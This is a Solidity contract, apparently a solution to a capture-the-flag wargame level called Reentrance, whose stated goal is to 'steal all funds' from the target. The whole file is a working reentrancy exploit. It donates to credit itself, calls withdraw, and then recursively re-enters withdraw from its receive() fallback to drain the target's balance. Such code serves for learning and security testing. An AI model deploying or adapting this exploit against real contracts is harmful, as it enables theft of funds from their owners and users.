// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

//Goal
//1. steal all funds from Reentrance

contract Exploit {
    address public target;

    constructor(address _t) {
        target = _t;
    }

    function exploit() external payable {
        (bool ok, ) = target.call{value: msg.value}(
            abi.encodeWithSignature("donate(address)", address(this))
        );
        require(ok, "failed to call donate()");

        (ok, ) = target.call(
            abi.encodeWithSignature("withdraw(uint256)", 1 ether)
        );
        require(ok, "failed to exploit");
    }

    receive() external payable {
        if (target.balance > 1 ether) {
            (bool ok, ) = target.call(
                abi.encodeWithSignature("withdraw(uint256)", 1 ether)
            );
            require(ok, "failed to call");
        }
    }
}
